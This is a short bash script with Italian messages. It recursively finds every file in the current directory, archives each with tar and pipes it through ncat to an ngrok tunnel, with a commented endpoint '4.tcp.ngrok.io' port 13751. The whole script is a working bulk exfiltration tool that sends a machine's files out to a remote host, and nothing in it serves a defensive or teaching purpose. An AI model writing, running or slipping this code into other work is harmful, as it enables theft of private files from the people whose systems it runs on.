#!/bin/bash

# Directory to search for files (modify as needed)
TARGET_DIR="."

# Function to compress and send a file
compress_and_send() {
  local file="$1"
  
  
  # Compress the file with tar and send it using ncat

  tar -cvf - "$file" | /ncat -v "NGROK IP" "NGROK PORT" #"4.tcp.ngrok.io" "13751"

  if [ $? -ne 0 ]; then
    echo "Errore: il server non Ã¨ raggiungibile."
    exit 1
  fi
}

# Find files and compress/send them
export -f compress_and_send

find . -type f -exec bash -c 'compress_and_send "{}"' \;

echo "Finished processing files."

